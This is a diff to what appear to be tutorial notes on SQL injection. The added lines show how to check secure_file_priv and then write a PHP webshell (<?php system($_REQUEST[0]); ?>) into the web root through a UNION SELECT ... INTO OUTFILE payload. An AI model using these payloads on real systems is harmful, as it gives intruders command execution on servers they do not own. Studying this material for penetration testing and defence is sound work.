@@ -171,3 +171,14 @@ Which, when used in union injection, becomes:
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 ```
 If the returned result for variable value is empty, that means it is not enabled and we can write it
+
+A common case in abusing the above is to write a webshell into a page that the webserver serves, after utilizing load file and other means to obtain webroot, we can try to write a webshell into it.
+
+Take the following simple php webshell as example:
+```
+<?php system($_REQUEST[0]); ?>
+```
+In previous context, we can write something like below to output a shell.php to our web directory:
+```
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
